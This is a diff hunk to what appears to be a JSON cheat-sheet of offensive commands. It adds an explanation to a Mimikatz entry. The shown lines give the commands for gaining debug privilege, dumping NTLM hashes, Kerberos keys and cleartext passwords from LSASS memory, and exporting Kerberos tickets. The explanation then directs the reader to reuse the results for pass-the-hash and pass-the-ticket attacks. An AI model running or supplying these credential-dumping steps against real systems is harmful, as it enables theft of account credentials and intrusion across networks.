@@ -140,5 +140,6 @@
       "command": "privilege::debug\nsekurlsa::tickets /export",
       "label": "privilege::debug sekurlsa::tickets…"
     }
-  ]
+  ],
+  "explain": "Dumps live credentials from LSASS memory with Mimikatz:\n  privilege::debug         acquire SeDebugPrivilege (needs SYSTEM or an admin token)\n  sekurlsa::logonpasswords extract NTLM hashes, Kerberos keys, and sometimes cleartext passwords from every cached logon session\nUse the recovered hashes for pass-the-hash; sekurlsa::tickets /export saves TGTs/TGSs for pass-the-ticket."
 }
